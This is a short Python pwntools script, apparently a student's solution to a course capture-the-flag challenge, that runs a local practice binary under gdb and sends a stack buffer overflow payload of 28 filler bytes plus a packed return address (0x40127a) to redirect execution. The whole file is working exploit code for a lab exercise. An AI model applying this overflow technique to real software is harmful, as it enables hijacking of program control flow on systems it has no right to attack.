from typing import Any
import pwn

pwn.context.clear(arch="amd64")

p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")

pwn.gdb.attach(target=p)

main_payload = bytearray()
main_payload += b"a" * 28
main_payload += pwn.p64(0x40127a)

print(p.recvline())
p.sendline(main_payload)
p.interactive()
